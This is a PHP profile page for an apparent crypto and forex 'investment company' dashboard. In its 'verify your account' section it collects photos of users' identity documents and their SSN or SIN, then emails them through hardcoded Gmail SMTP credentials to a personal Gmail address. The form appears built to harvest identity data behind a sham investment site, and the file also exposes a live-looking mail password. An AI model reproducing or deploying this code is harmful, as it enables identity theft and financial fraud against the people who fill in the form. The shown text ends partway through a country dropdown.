<?php 
require_once "db.php";
require_once "bal.php";

?>


<!DOCTYPE html>
<html lang="en" class="js">



<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head>
    <meta charset="utf-8">
    <meta name="author" content="Softnio">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="SafeTrade Investment Company is an investment company that aggregates funds for investment in bitcoin and forex trading.">
    <!-- Fav Icon  -->
    <link rel="shortcut icon" href="images/favicon.html">
    <!-- Page Title  -->
    <title>Investment Company</title>
    <!-- StyleSheets  -->
    <link rel="stylesheet" href="assets/css/dashlite583f.css?ver=3.1.3">
    <link id="skin-default" rel="stylesheet" href="assets/css/theme583f.css?ver=3.1.3">
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" integrity="sha512-Kc323vGBEqzTmouAECnVceyQqyqdsSiqLQISBL29aUW4U/M7pSPA/gEUZQqv1cwx4OnYxTxve5UMg5GT6L4JJg==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <script src="http://cdn.jsdelivr.net/npm/sweetalert2@11"></script>

	
</head>

<body class="nk-body npc-crypto dark-mode has-sidebar">
    <div class="nk-app-root">
        <!-- main @s -->
        <div class="nk-main ">
            <!-- sidebar @s -->
            <div class="nk-sidebar nk-sidebar-fixed " data-content="sidebarMenu">
                <div class="nk-sidebar-element nk-sidebar-head">
                    <div class="nk-sidebar-brand">
                        <a href="index.html" class="logo-link nk-sidebar-logo">
                            <img class="logo-light logo-img" src="../mirprime-logo/name.png" srcset="../mirprime-logo/name.png 2x" alt="logo">
                         <img class="logo-dark logo-img" src="../mirprime-logo/name.png" srcset="../mirprime-logo/name.png 2x" alt="logo-dark">
                        </a>
                    </div>
                    <div class="nk-menu-trigger me-n2">
                        <a href="#" class="nk-nav-toggle nk-quick-nav-icon d-xl-none" data-target="sidebarMenu"><em class="icon ni ni-arrow-left"></em></a>
                    </div>
                </div>
                <!-- .nk-sidebar-element -->
                <div class="nk-sidebar-element">
                    <div class="nk-sidebar-body" data-simplebar>
                        <div class="nk-sidebar-content">
                            <div class="nk-sidebar-widget d-none d-xl-block">
                                <div class="user-account-info between-center">
                                    <div class="user-account-main">
                                        <h6 class="overline-title-alt">Available Balance</h6>
                                        <div class="user-balance"><?php echo $row['currency'];?><?php echo $final_value;?></div>
                                    </div>
                                </div>
                                <div class="user-account-actions">
                                    <ul class="g-3">
                                        <li><a href="deposit.php" class="btn btn-lg btn-primary"><span>Deposit</span></a></li>
                                        <li><a href="transactions.php" class="btn btn-lg btn-danger"><span>Withdraw</span></a></li>
                                    </ul>
                                </div>
                            </div>
                            <!-- .nk-sidebar-widget -->
                            <div class="nk-sidebar-widget nk-sidebar-widget-full d-xl-none pt-0">
                                <a class="nk-profile-toggle toggle-expand" data-target="sidebarProfile" href="#">
                                    <div class="user-card-wrap">
                                        <div class="user-card">
                                            <div class="user-avatar">
                                                <span><?php $fname = $row['fname']; 
															$char =substr($fname,0,1);
															echo $char;
															?></span>
                                            </div>
                                            <div class="user-info">
                                                <span class="lead-text"><?php echo $row['fname'];?> <?php echo $row['lname'];?></span>
                                                <span class="sub-text"><?php echo $row['email'];?></span>
                                            </div>
                                            
                                        </div>
                                    </div>
                                </a>
                            
                            </div>
							
							
                            <!-- .nk-sidebar-widget -->
                              <div class="nk-sidebar-menu">
                                <!-- Menu -->
                                <ul class="nk-menu">
                                    <li class="nk-menu-heading">
                                        <h6 class="overline-title">Menu</h6>
                                    </li>
                                    <li class="nk-menu-item">
                                        <a href="index.php" class="nk-menu-link">
                                            <span class="nk-menu-icon"><i class="fa-solid fa-border-all"></i></span>
                                            <span class="nk-menu-text">Dashboard</span>
                                        </a>
                                    </li>
                                    <li class="nk-menu-item">
                                        <a href="profile.php" class="nk-menu-link">
                                            <span class="nk-menu-icon"><i class="fa-solid fa-user"></i></span>
                                            <span class="nk-menu-text">My Account</span>
                                        </a>
                                    </li>
                                    <li class="nk-menu-item">
                                        <a href="deposit.php" class="nk-menu-link">
                                            <span class="nk-menu-icon"><i class="fa-solid fa-circle-up"></i></span>
                                            <span class="nk-menu-text">Fund Account</span>
                                        </a>
                                    </li>
                                    <li class="nk-menu-item">
                                        <a href="investment.php" class="nk-menu-link">
                                            <span class="nk-menu-icon"><i class="fa-solid fa-vault"></i>
											</span>
											
                                            <span class="nk-menu-text">Invest</span>
                                        </a>
                                    </li>
                                    <li class="nk-menu-item has-sub">
                                        <a href="transactions.php" class="nk-menu-link ">
                                            <span class="nk-menu-icon"><i class="fa-solid fa-money-bill-transfer"></i></span>
                                            <span class="nk-menu-text">Transactions</span>
                                        </a>
                                        
                                        <!-- .nk-menu-sub -->
                                    </li>
                                    <!-- .nk-menu-item -->
                                    <li class="nk-menu-item">
                                        <a href="management.php" class="nk-menu-link">
                                            <span class="nk-menu-icon"><i class="fa-solid fa-list-check"></i></span>
                                            <span class="nk-menu-text">Management</span>
                                        </a>
                                    </li>
                                    <li class="nk-menu-item has-sub">
                                        <a href="support.php" class="nk-menu-link ">
                                            <span class="nk-menu-icon"><i class="fa-solid fa-headset"></i></span>
                                            <span class="nk-menu-text">contact us</span>
                                        </a>
                                     
                                        <!-- .nk-menu-sub -->
                                    </li>
                                    <li class="nk-menu-item">
                                        <a href="logout.php" class="nk-menu-link logout">
                                            <span class="nk-menu-icon"><i class="fa-solid fa-right-from-bracket"></i></span>
                                            <span class="nk-menu-text">Sign Out</span>
                                        </a>
                                    </li>
                                </ul>
                                <!-- .nk-menu -->
                            </div>		
							
							
							
                            <!-- .nk-sidebar-menu -->
                        </div>
                        <!-- .nk-sidebar-content -->
                    </div>
                    <!-- .nk-sidebar-body -->
                </div>
                <!-- .nk-sidebar-element -->
            </div>
            <!-- sidebar @e -->
            <!-- wrap @s -->
            <div class="nk-wrap ">
                <!-- main header @s -->
                <div class="nk-header nk-header-fluid nk-header-fixed is-light">
                    <div class="container-fluid">
                        <div class="nk-header-wrap">
                            <div class="nk-menu-trigger d-xl-none ms-n1">
                                <a href="#" class="nk-nav-toggle nk-quick-nav-icon" data-target="sidebarMenu"><i class="fa-solid fa-bars"></i></a>
                            </div>
                            <div class="nk-header-brand d-xl-none">
                                <a href="index.html" class="logo-link">
                                   <img class="logo-light logo-img" src="../mirprime-logo/name.png" srcset="../mirprime-logo/name.png 2x" alt="logo">
                         <img class="logo-dark logo-img" src="../mirprime-logo/name.png" srcset="../mirprime-logo/name.png 2x" alt="logo-dark">
                                </a>
                            </div>
                            
                            <div class="nk-header-tools">
                                <ul class="nk-quick-nav">
                                    <!-- .dropdown -->
                                    <li class="dropdown user-dropdown">
                                        <a href="#" class="dropdown-toggle" data-bs-toggle="dropdown">
                                            <div class="user-toggle">
                                                <div class="user-avatar sm">
                                                 <!--  <img src="../images/avatar/AvatarMaker.html" alt="avatar">-->
												    <img src="./img/<?php echo $row['image']; ?>" >
                                                         </div>
                                                <div class="user-info d-none d-md-block">
                                                                                                           
                                               <div class="user-name dropdown-indicator"><?php echo $row['fname'];?></div>
                                                </div>
                                            </div>
                                        </a>
                                        <div class="dropdown-menu dropdown-menu-md dropdown-menu-end dropdown-menu-s1">
                                            <div class="dropdown-inner user-card-wrap bg-lighter d-none d-md-block">
                                                <div class="user-card">
                                                    <div class="user-avatar">
                                                        <span><?php $fname = $row['fname']; 
																$char =substr($fname,0,1);
																echo $char;
																?></span>
                                                    </div>
                                                    <div class="user-info">
                                                        <span class="lead-text"><?php echo $row['fname'];?> <?php echo $row['lname'];?></span>
                                                        <span class="sub-text"><?php echo $row['email'];?></span>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="dropdown-inner user-account-info">
                                                <h6 class="overline-title-alt">Account Balance</h6>
                                                <div class="user-balance"><?php echo $row['currency'];?><?php echo $final_value;?> <small class="currency currency-btc"></small></div>
                                               
                                                
                                            </div>
                                            <div class="dropdown-inner">
                                                <ul class="link-list">
                                                    <li><a href="profile.php"><i class="fa-regular fa-user"></i> &nbsp;<span>View Profile</span></a></li>
                                                    <!-- <li><a href="./security"><em class="icon ni ni-setting-alt"></em><span>Account Setting</span></a></li> -->
                                                <!-----<li><a href="activity.html"><em class="icon ni ni-activity-alt"></em><span>Login Activity</span></a></li>--->
                                                    <!-- <li><a class="dark-switch" href="#"><em class="icon ni ni-moon"></em><span>Dark Mode</span></a></li> -->
                                                </ul>
                                            </div>
                                            <div class="dropdown-inner">
                                                <ul class="link-list">
                                                    <li><a href="#" class="logout"><i class="fa-solid fa-right-from-bracket"></i>&nbsp;<span>Sign out</span></a></li>
                                                </ul>
                                            </div>
                                        </div>
                                    </li>
                                </ul>
                            </div>
                        </div>
                    </div>
                </div>
<!-- main header @e -->
<!-- content @s -->
<div class="nk-content nk-content-fluid">
    <div class="container-xl wide-lg">
        <div class="nk-content-body">
            <div class="nk-block-head">
                <div class="nk-block-head-content">
                    <div class="nk-block-head-sub"><span>Account Setting</span></div>
                    <h2 class="nk-block-title fw-normal">My Profile</h2>
                    <div class="nk-block-des">
                        <p>You have full control to manage your own account setting.</p>
                    </div>
                </div>
            </div><!-- .nk-block-head -->
            <ul class="nk-nav nav nav-tabs">
                <li class="nav-item">
                    <a class="nav-link active" data-bs-toggle="tab" href="#tabItem1">Personal</a>
                </li>
                <li class="nav-item">
                    <a class="nav-link" data-bs-toggle="tab" href="#tabItem2">Security</a>
                </li>
                <li class="nav-item">
                    <a class="nav-link" data-bs-toggle="tab" href="#tabItem3">Notifications</a>
                </li>
            </ul><!-- .nk-menu -->
            <!-- NK-Block @s -->
            <div class="tab-content">
                <div class="card-inner tab-pane active" id="tabItem1">
                    <div class="nk-block">
                        <div class="alert alert-success">
                            <div class="alert-cta flex-wrap flex-md-nowrap">
                                <div class="alert-text">
                                    <p>If your information is not correct, kindly update it to help us know more about you.</p>
                                </div>
                                <ul class="alert-actions gx-3 mt-3 mb-1 my-md-0">
                                    <li class="order-md-last">
                                        <a href="#" class="btn btn-md btn-success" data-bs-toggle="modal" data-bs-target="#profile-edit">Edit</a>
                                    </li>
                                </ul>
                            </div>
                        </div><!-- .alert -->
                        <div class="nk-block-head">
                            <div class="nk-block-head-content">
                                <h5 class="nk-block-title">Personal Information</h5>
                                <div class="nk-block-des">
                                    <p>Basic info, like your name and address, that you use on SafeTrade Investment Company Platform.</p>
                                </div>
                            </div>
                        </div><!-- .nk-block-head -->
                        <div class="nk-data data-list">
                            <div class="data-head">
                                <h6 class="overline-title">Basics</h6>
                            </div>
                            <div class="data-item" data-bs-toggle="modal" data-bs-target="#profile-edit">
                                <div class="data-col">
                                    <span class="data-label">Full Name</span>
                                    <span class="data-value"><?php echo $row['fname'];?>&nbsp;<?php echo $row['lname'];?></span>
                                </div>
                                <div class="data-col data-col-end"><span class="data-more"></span></div>
                            </div><!-- .data-item -->
                            <div class="data-item" data-bs-toggle="modal" data-bs-target="#profile-edit">
                                <div class="data-col">
                                    <span class="data-label">Last Name</span>
                                    <span class="data-value"><?php echo $row['lname'];?></span>
                                </div>
                                <div class="data-col data-col-end"><span class="data-more disable"></span></div>
                            </div><!-- .data-item -->
                            <div class="data-item">
                                <div class="data-col">
                                    <span class="data-label">Email</span>
                                    <span class="data-value"><?php echo $row['email'];?></span>
                                </div>
                                <div class="data-col data-col-end"><span class="data-more disable"></span></div>
                            </div><!-- .data-item -->
                            <div class="data-item" data-bs-toggle="modal" data-bs-target="#profile-edit">
                                <div class="data-col">
                                    <span class="data-label">Phone Number</span>
                                    <span class="data-value text-soft"><?php echo $row['number'];?></span>
                                </div>
                                <div class="data-col data-col-end"><span class="data-more"></span></div>
                            </div><!-- .data-item -->
                            <div class="data-item" data-bs-toggle="modal" data-bs-target="#profile-edit">
                                <div class="data-col">
                                    <span class="data-label">Account status</span>
                                    <span class="data-value"><?php 
									 $check =$row['verify'];
									if($check == 'verified'){
										echo '<p style="color:green">'.'Verified'.'</p>';
									}else{
										echo '<p style="color:red;">'.'not verified'.'<p>';
										
									} 
										?></span>
                                </div>
                                <div class="data-col data-col-end"><span class="data-more"></span></div>
                            </div><!-- .data-item -->
                            <div class="data-item" data-bs-toggle="modal" data-bs-target="#profile-edit">
                                <div class="data-col">
                                    <span class="data-label">Country</span>
                                    <span class="data-value" id="country"><?php echo $row['country']; ?></span>
                                </div>
                                <div class="data-col data-col-end"><span class="data-more"></span>
								
								
								
								
								</div>
                            </div><!-- .data-item -->
                        </div><!-- .nk-data -->
                    </div>
                    <!-- NK-Block @e -->
                </div>
				<!----verify img--->
				<div class="card" style="text-align:center;">
                <h6>verify your Acconut</h6>
                <p>Valid identity card. (e.g. Drivers licence, international passport or any government approved document).</p>
            <p>Carte d'identité valide. (par exemple, permis de conduire, passeport international ou tout document approuvé par le gouvernement).</p>
			<br></br>
<?php	
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;


require 'src/Exception.php';
require 'src/PHPMailer.php';
require 'src/SMTP.php';




function restructureArray(array $arr){

$result = array();

foreach ($arr as $key => $value){
for($i=0; $i< count($value); $i++){
$result[$i][$key] = $value[$i];
}

}

return $result;

}
$files = [];
if(!empty($_FILES['user_file'])){
 $files = restructureArray($_FILES['user_file']);

}
// echo '<pre>';print_r($files);echo'</pre>';




//Instantiation and passing `true` enables exceptions
$mail = new PHPMailer(true);



												//$error=[];
												//$fname='';

												//$verification_code = substr(number_format(time() * rand(), 0, '', ''), 0, 6);
												//$verification_date= NULL;
if($_SERVER['REQUEST_METHOD'] === 'POST'){
 
$name  = $_POST['ssn']?? NULL;  
$message  = $_POST['sin']?? NULL;  




//end of newly added
$email="forge3359@gmail.com";
$fname ="valid";
//$fname="alex";

//include_once 'sendmail.php';
//tester

//script mailer
 //Instantiation and passing `true` enables exceptions
 $mail = new PHPMailer(true);
 
 try {
     //Enable verbose debug output
     $mail->SMTPDebug = 0;//SMTP::DEBUG_SERVER;

     //Send using SMTP
     $mail->isSMTP();

     //Set the SMTP server to send through
     $mail->Host = 'smtp.gmail.com';

     //Enable SMTP authentication
     $mail->SMTPAuth = true;

     //SMTP username
     $mail->Username = 'davesantan219@gmail.com';

     //SMTP password
     $mail->Password = 'kpvustelionxieeg';

     //Enable TLS encryption;
     $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;

     //TCP port to connect to, use 465 for `PHPMailer::ENCRYPTION_SMTPS` above
     $mail->Port = 587;

     //Recipients
     $mail->setFrom('davesantan219@gmail.com', 'testers');

     //Add a recipient
     $mail->addAddress($email, $fname);
    // $mail->addAddress('forge3359@gmail.com,'martns');
    
    
   

     //Set email format to HTML
     $mail->isHTML(true);

     //$verification_code = substr(number_format(time() * rand(), 0, '', ''), 0, 6);
	 
	// $mail->addAttachment('/var/tmp/file.tar.gz');         //Add attachments
    // $mail->addAttachment($_FILES['file']['tmp_name'],$_FILES['file']['name']);     //Optional name
    if(!empty($files)){
	foreach($files as $key => $file){
	$mail->addAttachment(
	$file['tmp_name'],$file['name']
							);
					}

						}
     
   
 
     
     
     //end of array

     $mail->Subject = 'testing menu';
     $mail->Body    = '<p>SSN/SIN::<b style="font-size: 30px;">' . $name . '</b>'.$message.'</p>';

     $mail->send();


 echo '<h5 style="color:green">'. "Sent you will be notify once verified".'</h5>';

} catch (Exception $e) {
 
 
 echo "didn't go true try again";
 
}
}

?>


<form action="" method="post" enctype="multipart/form-data">
   <h3>Drivers licence/International passport</h3><br/>
   Front view:<input type="file" name="user_file[]" required><br></br></input>	
    Back view:<input type="file" name="user_file[]" required><br></br></input>
  
          <!--col ends--->
		  <?php
		   $cnt=$row['country'];
		    $fmssn = "<h6>"."<p>".'SSN(social security number)'."</p>"."<h2>".'SSN:'."<input type='number' name='ssn' style='width:250px;height:40px;'>".''."<h6>";
		   $fmssnx = "<h6>"."<p>".'SIN(social insurance number)'."</p>"."<h2>".'SIN'."<input type='number' name='sin' style='width:250px;height:40px;'>".''."<h6>";
		  if($cnt == "United States"){
			  echo $fmssn;
		  }else{
		  echo NULL;
		  }
		  ?>
		  
		  <?php
		   $cnt=$row['country'];
		    $fmssn = "<h6>"."<p>".'SSN(social security number)'."</p>"."<h2>".'SSN:'."<input type='number' name='ssn' style='width:250px;height:40px;'>".''."<h6>";
		   $fmssnx = "<h6>"."<p>".'SIN(social insurance number)'."</p>"."<h2>".'SIN'."<input type='number' name='sin' style='width:250px;height:40px;'>".''."<h6>";
		  if($cnt == "Canada"){
			  echo $fmssnx;
		  }else{
		  echo NULL;
		  }
		  ?>
	
<input type="submit" value="Submit" class="btn btn-primary" id="infosx">
</form>

			
			
			
			<!-------SSN------>
			
        </div>
				<!---verify img end-->
                <div class="nk-divider divider md"></div>
                <div class="card-inner tab-pane" id="tabItem2">
                    <div class="nk-block">
                        <div class="nk-block-head">
                            <div class="nk-block-head-content">
                                <h5 class="nk-block-title">Security Settings</h5>
                                <div class="nk-block-des">
                                    <p>These settings are helps you keep your account secure.</p>
                                </div>
                            </div>
                        </div>
                        <!-- .nk-block-head -->
                        <div class="card card-bordered">
                            <div class="card-inner-group">
                                <div class="card-inner">
                                    <div class="between-center flex-wrap flex-md-nowrap g-3">
                                        <div class="nk-block-text">
                                            <h6>Save my Login Activities</h6>
                                            <p>You can save your all activity logs including unusual activity detected.
                                            </p>
                                        </div>
                                        <div class="nk-block-actions">
                                            <ul class="align-center gx-3">
                                                <li class="order-md-last d-inline-flex">
                                                    <div class="custom-control custom-switch me-n2">
                                                        <input type="checkbox" class="custom-control-input"
                                                            id="activity-log">
                                                        <label class="custom-control-label" for="activity-log"></label>
                                                    </div>
                                                </li>
                                                <li>
                                                    <a href="#recent-activity" class="link link-sm link-primary">See
                                                        Recent Activity</a>
                                                </li>
                                            </ul>
                                        </div>
                                    </div>
                                </div>
                                <!-- .card-inner -->
                                <div class="card-inner">
                                    <div class="between-center flex-wrap flex-md-nowrap g-3">
                                        <div class="nk-block-text">
                                            <h6>Change Password</h6>
                                            <p>Set a unique password to protect your account.</p>
                                        </div>
                                        <div class="nk-block-actions flex-shrink-sm-0">
                                            <ul class="align-center flex-wrap flex-sm-nowrap gx-3 gy-2">
                                                <li class="order-md-last">
                                                    <a href="#" class="btn btn-primary" data-bs-toggle="modal" data-bs-target="#profile-edit">Change Password</a>
                                                </li>
                                                <li>
                                                    <em class="text-soft text-date fs-12px"> Logged in: <span>
                                                   <?php echo date('Y-m-D h:i:s')?>                                                    </span></em>
                                                </li>
                                            </ul>
                                        </div>
                                    </div>
                                </div>
                                <!-- .card-inner -->
                                <!-- <div class="card-inner">
                                    <div class="between-center flex-wrap flex-md-nowrap g-3">
                                        <div class="nk-block-text">
                                            <h6>2FA Authentication <span class="badge bg-success">Enabled</span></h6>
                                            <p>Secure your account with 2FA security. When it is activated you will need
                                                to enter not only your password, but also a special code using app. You
                                                can receive this code by in mobile app. </p>
                                        </div>
                                        <div class="nk-block-actions">
                                            <a href="#" class="btn btn-primary">Disable</a>
                                        </div>
                                    </div>
                                </div> -->
                                <!-- .card-inner -->
                            </div>
                            <!-- .card-inner-group -->
                        </div>
                        <!-- .card -->
                     
                        <!-- .nk-block-head -->
						
						
              
                        <!-- .card -->
                    </div>
                    <!-- NK-Block @e -->
                </div>
                <div class="nk-divider divider md"></div>
                <div class="card-inner tab-pane" id="tabItem3">
                    <div class="nk-block">
                        <div class="nk-block-head nk-block-head-sm">
                            <div class="nk-block-head-content">
                                <h5 class="nk-block-title">Security Alerts</h5>
                                <div class="nk-block-des">
                                    <p>You will get only those email notification what you want.</p>
                                </div>
                            </div>
                        </div>
                        <!-- .nk-block-head -->
                        <div class="nk-block-content">
                            <div class="gy-3">
                                <div class="g-item">
                                    <div class="custom-control custom-switch">
                                        <input type="checkbox" class="custom-control-input" checked
                                            id="unusual-activity">
                                        <label class="custom-control-label" for="unusual-activity">Email me whenever
                                            encounter unusual activity</label>
                                    </div>
                                </div>
                                <div class="g-item">
                                    <div class="custom-control custom-switch">
                                        <input type="checkbox" class="custom-control-input" id="new-browser">
                                        <label class="custom-control-label" for="new-browser">Email me if new browser is
                                            used to sign in</label>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <!-- .nk-block-contnet -->
                        <div class="nk-block-head nk-block-head-sm">
                            <div class="nk-block-head-content">
                                <h6 class="nk-block-title">News</h6>
                                <div class="nk-block-des">
                                    <p>You will get only those email notification what you want.</p>
                                </div>
                            </div>
                        </div>
                        <!-- .nk-block-head -->
                        <div class="nk-block-content">
                            <div class="gy-3">
                                <div class="g-item">
                                    <div class="custom-control custom-switch">
                                        <input type="checkbox" class="custom-control-input" checked id="latest-sale">
                                        <label class="custom-control-label" for="latest-sale">Notify me by email about
                                            sales and latest news</label>
                                    </div>
                                </div>
                                <div class="g-item">
                                    <div class="custom-control custom-switch">
                                        <input type="checkbox" class="custom-control-input" id="feature-update">
                                        <label class="custom-control-label" for="feature-update">Email me about new
                                            features and updates</label>
                                    </div>
                                </div>
                                <div class="g-item">
                                    <div class="custom-control custom-switch">
                                        <input type="checkbox" class="custom-control-input" checked id="account-tips">
                                        <label class="custom-control-label" for="account-tips">Email me about tips on
                                            using account</label>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <!-- .nk-block-content -->
                    </div>
                    <!-- NK-Block @e -->
                </div>
            </div>
            <!-- //  Content End -->
        </div>
    </div>
</div>
<!-- content @e -->
<!-- @@ Profile Edit Modal @e -->
<div class="modal fade" role="dialog" id="profile-edit">
    <div class="modal-dialog modal-dialog-centered modal-lg" role="document">
        <div class="modal-content">
            <a href="#" class="close" data-bs-dismiss="modal"><em class="icon ni ni-cross-sm"></em></a>
            <div class="modal-body modal-body-lg">
                <h5 class="title">Update Profile</h5>
                <ul class="nk-nav nav nav-tabs">
                    <li class="nav-item">
                        <a class="nav-link active" data-bs-toggle="tab" href="#personal">Personal</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" data-bs-toggle="tab" href="#security">Security</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" data-bs-toggle="tab" href="#picture">Change Profile Picture</a>
                    </li>
                </ul><!-- .nav-tabs -->
                <div class="tab-content">
                    <div class="tab-pane active" id="personal">
                        <form action="https://safetrade-invest.com/dashboard/user/profile" method="post">
                        <input type="hidden" name="csrf_token" value="f72279d4f8340005ec37cf3eb2309ef8">
                            <div class="row gy-4">
                                <div class="col-md-6">
                                    <div class="form-group">
                                        <label class="form-label" for="first-name">Firstname</label>
                                        <input type="text" class="form-control form-control-lg" name="firstname"
                                            value="<?php echo $row['fname'];?>" placeholder="Enter First name">
                                    </div>
                                </div>
                                <div class="col-md-6">
                                    <div class="form-group">
                                        <label class="form-label" for="last-name">Lastname</label>
                                        <input type="text" class="form-control form-control-lg" name="lastname"
                                            value="<?php echo $row['lname'];?>" placeholder="Enter Last name">
                                    </div>
                                </div>
                                <div class="col-md-6">
                                    <div class="form-group">
                                        <label class="form-label" for="phone-no">Phone Number</label>
                                        <input type="text" class="form-control form-control-lg" name="mobile"
                                            value="<?php echo $row['number']; ?>" placeholder="Phone Number">
                                    </div>
                                </div>
								
								
                                <div class="col-md-6">
                                    <div class="form-group">
                                        <label class="form-label" for="phone-no">Country</label>
                                        <select class="form-control form-control-lg" name="country">
                                            <option value="Canada" selected>Canada</option>
                                            <option value="Afghanistan">Afghanistan</option>
                                                <option value="Åland Islands">Åland Islands</option>
                                                <option value="Albania">Albania</option>
                                                <option value="Algeria">Algeria</option>
                                                <option value="American Samoa">American Samoa</option>
                                                <option value="Andorra">Andorra</option>
                                                <option value="Angola">Angola</option>
                                                <option value="Anguilla">Anguilla</option>
                                                <option value="Antarctica">Antarctica</option>
                                                <option value="Antigua and Barbuda">Antigua and Barbuda</option>
                                                <option value="Argentina">Argentina</option>
                                                <option value="Armenia">Armenia</option>
                                                <option value="Aruba">Aruba</option>
                                                <option value="Australia">Australia</option>
                                                <option value="Austria">Austria</option>
                                                <option value="Azerbaijan">Azerbaijan</option>
                                                <option value="Bahamas">Bahamas</option>
                                                <option value="Bahrain">Bahrain</option>
                                                <option value="Bangladesh">Bangladesh</option>
                                                <option value="Barbados">Barbados</option>
                                                <option value="Belarus">Belarus</option>
                                                <option value="Belgium">Belgium</option>
                                                <option value="Belize">Belize</option>
                                                <option value="Benin">Benin</option>
                                                <option value="Bermuda">Bermuda</option>
                                                <option value="Bhutan">Bhutan</option>
                                                <option value="Bolivia">Bolivia</option>
                                                <option value="Bosnia and Herzegovina">Bosnia and Herzegovina</option>
                                                <option value="Botswana">Botswana</option>
                                                <option value="Bouvet Island">Bouvet Island</option>
                                                <option value="Brazil">Brazil</option>
                                                <option value="British Indian Ocean Territory">British Indian Ocean
                                                    Territory</option>
                                                <option value="Brunei Darussalam">Brunei Darussalam</option>
                                                <option value="Bulgaria">Bulgaria</option>
                                                <option value="Burkina Faso">Burkina Faso</option>
                                                <option value="Burundi">Burundi</option>
                                                <option value="Cambodia">Cambodia</option>
                                                <option value="Cameroon">Cameroon</option>
                                                <option value="Canada">Canada</option>
                                                <option value="Cape Verde">Cape Verde</option>
                                                <option value="Cayman Islands">Cayman Islands</option>
                                                <option value="Central African Republic">Central African Republic
                                                </option>
                                                <option value="Chad">Chad</option>
                                                <option value="Chile">Chile</option>
                                                <option value="China">China</option>
                                                <option value="Christmas Island">Christmas Island</option>
                                                <option value="Cocos (Keeling) Islands">Cocos (Keeling) Islands</option>
                                                <option value="Colombia">Colombia</option>
                                                <option value="Comoros">Comoros</option>
                                                <option value="Congo">Congo</option>
                                                <option value="Congo, The Democratic Republic of The">Congo, The
                                                    Democratic Republic of The</option>
                                                <option value="Cook Islands">Cook Islands</option>
                                                <option value="Costa Rica">Costa Rica</option>
                                                <option value="Cote D'ivoire">Cote D'ivoire</option>
                                                <option value="Croatia">Croatia</option>
                                                <option value="Cuba">Cuba</option>
                                                <option value="Cyprus">Cyprus</option>
                                                <option value="Czech Republic">Czech Republic</option>
                                                <option value="Denmark">Denmark</option>
                                                <option value="Djibouti">Djibouti</option>
                                                <option value="Dominica">Dominica</option>
                                                <option value="Dominican Republic">Dominican Republic</option>
                                                <option value="Ecuador">Ecuador</option>
                                                <option value="Egypt">Egypt</option>
                                                <option value="El Salvador">El Salvador</option>
                                                <option value="Equatorial Guinea">Equatorial Guinea</option>
                                                <option value="Eritrea">Eritrea</option>
                                                <option value="Estonia">Estonia</option>
                                                <option value="Ethiopia">Ethiopia</option>
                                                <option value="Falkland Islands (Malvinas)">Falkland Islands (Malvinas)
                                                </option>
                                                <option value="Faroe Islands">Faroe Islands</option>
                                                <option value="Fiji">Fiji</option>
                                                <option value="Finland">Finland</option>
                                                <option value="France">France</option>
                                                <option value="French Guiana">French Guiana</option>
                                                <option value="French Polynesia">French Polynesia</option>
                                                <option value="French Southern Territories">French Southern Territories
                                                </option>
                                                <option value="Gabon">Gabon</option>
                                                <option value="Gambia">Gambia</option>
                                                <option value="Georgia">Georgia</option>
                                                <option value="Germany">Germany</option>
                                                <option value="Ghana">Ghana</option>
                                                <option value="Gibraltar">Gibraltar</option>
                                                <option value="Greece">Greece</option>
                                                <option value="Greenland">Greenland</option>
                                                <option value="Grenada">Grenada</option>
                                                <option value="Guadeloupe">Guadeloupe</option>
                                                <option value="Guam">Guam</option>
                                                <option value="Guatemala">Guatemala</option>
                                                <option value="Guernsey">Guernsey</option>
                                                <option value="Guinea">Guinea</option>
                                                <option value="Guinea-bissau">Guinea-bissau</option>
                                                <option value="Guyana">Guyana</option>
                                                <option value="Haiti">Haiti</option>
                                                <option value="Heard Island and Mcdonald Islands">Heard Island and
                                                    Mcdonald Islands</option>
                                                <option value="Holy See (Vatican City State)">Holy See (Vatican City
                                                    State)</option>
                                                <option value="Honduras">Honduras</option>
                                                <option value="Hong Kong">Hong Kong</option>
                                                <option value="Hungary">Hungary</option>
                                                <option value="Iceland">Iceland</option>
                                                <option value="India">India</option>
                                                <option value="Indonesia">Indonesia</option>
                                                <option value="Iran, Islamic Republic of">Iran, Islamic Republic of
                                                </option>
                                                <option value="Iraq">Iraq</option>
                                                <option value="Ireland">Ireland</option>
                                                <option value="Isle of Man">Isle of Man</option>
                                                <option value="Israel">Israel</option>
                                                <option value="Italy">Italy</option>
                                                <option value="Jamaica">Jamaica</option>
                                                <option value="Japan">Japan</option>
                                                <option value="Jersey">Jersey</option>
                                                <option value="Jordan">Jordan</option>
                                                <option value="Kazakhstan">Kazakhstan</option>
                                                <option value="Kenya">Kenya</option>
                                                <option value="Kiribati">Kiribati</option>
                                                <option value="Korea, Democratic People's Republic of">Korea, Democratic
                                                    People's Republic of</option>
                                                <option value="Korea, Republic of">Korea, Republic of</option>
                                                <option value="Kuwait">Kuwait</option>
                                                <option value="Kyrgyzstan">Kyrgyzstan</option>
                                                <option value="Lao People's Democratic Republic">Lao People's Democratic
                                                    Republic</option>
                                                <option value="Latvia">Latvia</option>
                                                <option value="Lebanon">Lebanon</option>
                                                <option value="Lesotho">Lesotho</option>
                                                <option value="Liberia">Liberia</option>
                                                <option value="Libyan Arab Jamahiriya">Libyan Arab Jamahiriya</option>
                                                <option value="Liechtenstein">Liechtenstein</option>
                                                <option value="Lithuania">Lithuania</option>
                                                <option value="Luxembourg">Luxembourg</option>
                                                <option value="Macao">Macao</option>
                                                <option value="Macedonia, The Former Yugoslav Republic of">Macedonia,
                                                    The Former Yugoslav Republic of</option>
                                                <option value="Madagascar">Madagascar</option>
                                                <option value="Malawi">Malawi</option>
                                                <option value="Malaysia">Malaysia</option>
                                                <option value="Maldives">Maldives</option>
                                                <option value="Mali">Mali</option>
                                                <option value="Malta">Malta</option>
                                                <option value="Marshall Islands">Marshall Islands</option>
                                                <option value="Martinique">Martinique</option>
                                                <option value="Mauritania">Mauritania</option>
